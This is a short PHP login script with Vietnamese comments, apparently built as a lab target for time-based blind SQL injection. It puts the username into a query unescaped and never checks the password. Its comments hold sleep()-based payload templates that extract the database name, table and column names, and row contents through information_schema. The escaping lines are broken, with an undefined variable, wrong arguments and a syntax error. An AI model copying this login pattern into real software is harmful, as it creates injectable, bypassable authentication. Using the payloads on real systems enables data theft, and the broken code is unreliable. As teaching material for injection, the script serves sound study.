<?php

	//Khai báo sử dụng session
	session_start();
 
	//Khai báo utf-8 để hiển thị được tiếng việt
	header('Content-Type: text/html; charset=UTF-8');
	$conn = new mysqli('localhost','root', '','demo');

	$username = stripslashes($_REQUEST['username']);
	$username = mysqli_real_escape_string($con,$username,$_POST['username']);
	$password = stripslashes($_REQUEST['password']);
	$password = mysqli_real_escape_string(($con,$password,$_POST['password']);


	$sql = "SELECT * FROM member WHERE username = '$username'";
	
	//$sql = sprintf("SELECT * FROM member WHERE username = %s",$username);

	// Chèn câu lệnh truy xuất tên database
	//$sql = "SELECT * FROM member WHERE username = '1' OR (select sleep(1) from dual where database() like '%s')-- -'";

	// Chèn câu lệnh truy xuất tên bảng
	//$sql = "SELECT * FROM member WHERE username = '1' OR IF ((SELECT SUBSTRING(table_name,%s,1) FROM information_schema.columns where table_schema=database() limit %s,1) = '%s' , sleep(1), 'a')-- -'";

	// Chèn câu lệnh truy xuất tên cột
	//$sql = "SELECT * FROM member WHERE username = '1' OR IF ((SELECT SUBSTRING(column_name,%s,1) FROM information_schema.columns where table_name='{}' limit %s,1) = '%s' , sleep(1), 'a')-- -'";

	// chèn câu lệnh truy xuất dữ liệu có trong hàng của bảng
	//$sql = "SELECT * FROM member WHERE username = '1' OR IF ((SELECT SUBSTRING(CONCAT({}), %s, 1) FROM {} limit %s,1) = '%s' , sleep(1), 'a')-- -'";

	$result = $conn->query($sql);

	$password = md5($password);
	if($result->num_rows>0){
		$_SESSION['username'] = $username;
		echo "Bạn đã đăng nhập thành công với tên là: <b>".$username."</b>";
		echo '<b><br> Click tại đây để trở lại <a href="login.html">Trang Đăng nhập</a><br/></b>';
	}else{

?>
		<script type="text/javascript">
		alert("Sai thông tin!"); 
		(window.location="login.html");
		</script>
	<?php
	}

	$conn->close();
	?>